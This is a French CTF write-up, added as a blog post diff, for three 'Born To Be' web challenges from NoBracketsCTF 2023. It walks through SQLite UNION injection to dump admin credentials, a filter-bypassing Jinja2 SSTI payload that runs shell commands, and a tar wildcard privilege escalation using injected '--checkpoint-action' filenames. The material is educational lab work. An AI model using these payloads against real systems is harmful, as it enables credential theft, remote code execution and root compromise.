@@ -1,0 +1,175 @@
+---
+authors:
+  - Drahoxx
+title: "NoBracketsCTF 2023 -- Born To Be"
+description: "Trois challenges Born To Be du NoBracketsCTF 2023, de la SQL injection à la SSTI puis à l'élévation de privilèges via wildcard tar."
+publicationDate: 2024-08-25 00:00:00+0000
+cover: ../../../assets/blog/born-to-be-web/born-to-be.jpg
+coverAlt: "NoBracketsCTF 2023 -- Born To Be"
+categories:
+  - Web
+tags:
+  - NoBrackets
+  - CTF
+  - WriteUp
+  - Web
+  - System
+---
+
+## Contexte
+
+NoBracketsCTF est un CTF destiné aux lycéens ; ce challenge faisait partie de la finale.
+
+Le challenge est open-source : https://github.com/nobrackets-ctf/NoBracketsCTF-2023/tree/main/finale/Web/BornToBeAdmin/infra
+
+Il suffit de lancer `./run.sh` puis de visiter `http://localhost:5000/` pour accéder au challenge.
+
+## Born To Be Admin 1/3
+
+**Description :**
+```
+Do you like red-pandas? I love 'em!
+
+Your goal is to become administrator of the website.
+
+Author: [Drahoxx](https://twitter.com/50mgDrahoxx)
+```
+
+La première vulnérabilité est une SQLi dans la barre de recherche. Cela signifie que nous allons pouvoir faire fuiter des données via cette barre de recherche.
+Nous allons essayer de récupérer les identifiants de l'admin.
+
+![First look](../../../assets/blog/born-to-be-web/first-look.png)
+
+![Login form](../../../assets/blog/born-to-be-web/login.png)
+
+
+### Récupérer les noms des tables et des colonnes
+
+#### Nom de table
+
+Nous pouvons utiliser Payload All the Things pour nous aider :
+Dans `Sqlite` > `Integer/String based - Extract table name`, on trouve le [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#integerstring-based---extract-table-name) suivant :
+
+`SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'`
+
+Que nous adaptons en :
+`aaaaa' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -`
+
+Nous obtenons : `users,data`
+
+#### Noms des colonnes
+
+Comme nous savons qu'il existe une table `users`, nous pouvons essayer de faire fuiter les [noms des colonnes](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#integerstring-based---extract-column-name) :
+
+`aaaaaa' UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- -`
+
+Nous obtenons : `CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username VARCHAR(100) NOT NULL, password VARCHAR(100) NOT NULL, is_admin BOOLEAN NOT NULL DEFAULT 0 )`
+
+La table ressemble donc à ceci : | id (int) | username (str) | password (str) | is_admin (bool) |
+
+Nous pouvons commencer à récupérer les identifiants de l'admin.
+
+### Récupérer le nom d'utilisateur de l'admin
+
+`' UNION SELECT username FROM users WHERE is_admin=true-- -`
+
+Nous obtenons : `redpanda-master`
+
+### Récupérer le mot de passe de l'utilisateur
+
+`' UNION SELECT password FROM users WHERE is_admin=true-- -`
+
+![User Password](../../../assets/blog/born-to-be-web/password.png)
+
+
+Nous obtenons : `61983636aae8819f9a94b39bd0e6219d2212f0bcc37bb11032b559d6df26b07f`
+Il est présent dans rockyou et peut être cassé avec https://crackstation.net/
+Le mot de passe est `redpandas4ever`
+
+### Se connecter au compte admin
+
+Nous utilisons le formulaire de connexion :
+`redpanda-master`
+`redpandas4ever`
+
+![Admin panel](../../../assets/blog/born-to-be-web/admin.png)
+
+
+> `NBCTF{Y0u're_Th3_TrU3_redpanda-master_You've_Been_B0rn_T0_B3_An_Adm1n}`
+
+## Born To Be User 2/3
+
+**Description :**
+```
+You became admin of the website. Now is time to become user again!
+
+RCE and read content of `flag.txt`.
+
+Author: [Drahoxx](https://twitter.com/50mgDrahoxx)
+```
+
+Dans cette partie, la vulnérabilité est une SSTI dans le panel admin ; l'objectif est d'obtenir un shell, ou au moins une RCE.
+
+### Découverte de la SSTI
+
+En saisissant `{{7*7}}` dans la zone de texte, nous obtenons le résultat suivant : `Hello, redpanda-master. You searched for the username 49, here is your results :`
+
+Nous voyons le 49, donc notre SSTI fonctionne ; exploitons-la.
+
+![Simple SSTI](../../../assets/blog/born-to-be-web/simple-ssti.png)
+
+
+### Filtres
+
+Il y a deux petits filtres sur cette SSTI : `'`, `.` et `_` sont interdits.
+On le voit en saisissant `.` : nous obtenons `Error : . _ and ' are filtered to avoid interfering with sql.`
+
+### Exploit
+
+Nous pouvons à nouveau utiliser Payload All the Things comme point de départ pour notre payload : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread
+
+Nous allons utiliser le payload de Podalirius, car c'est le plus court :
+`{{ lipsum.__globals__["os"].popen('id').read() }}`
+
+Nous voyons qu'il y a `.`, `'` et `_` dans le payload ; il faut les retirer :
+
+1. Retirer '
+	Nous pouvons utiliser des guillemets doubles (") au lieu des guillemets simples (')
+2. Retirer .
+	Nous pouvons utiliser `|attr()` à la place de `.` dans jinja2
+3. Retirer _
+	Nous pouvons encoder `_` en `\x5f`
+4. Retirer [, car cela ne fonctionne pas avec attr
+	Nous pouvons utiliser la fonction `get` à la place
+
+Payload final : `{{lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("get")("os")|attr("popen")("cat flag\x2etxt")|attr("read")()}}`
+
+![Final SSTI](../../../assets/blog/born-to-be-web/nice-ssti.png)
+
+> `NBCTF{Fr0m_Adm1n_0n_W3bSite_T0_Us3r_0n_S3rver_SSTIs_are_FUN!}`
+
+## Born To Be Root 3/3
+
+**Description :**
+```
+Wp RCE! Now is time to become root.
+
+Flag is located in `/root`.
+
+Author: [Drahoxx](https://twitter.com/50mgDrahoxx)
+```
+
+https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+
+```sh
+echo -e \"#!/bin/bash\\ncat /root/* > result\" > shell\x2esh
+echo \"\" > \"--checkpoint-action=exec=sh shell\x2esh\"
+echo \"\" > --checkpoint=1
+## Wait one minute
+ls -la
+## If there is result, you can cat it.
+cat result
+```
+Nous obtenons `NBCTF{You&#39;ve_Really_Becomed_Th3_R3d_Panda_And_Red_Team_Master!}`, ce qui se traduit par :
+
+> `NBCTF{You've_Really_Becomed_Th3_R3d_Panda_And_Red_Team_Master!}`
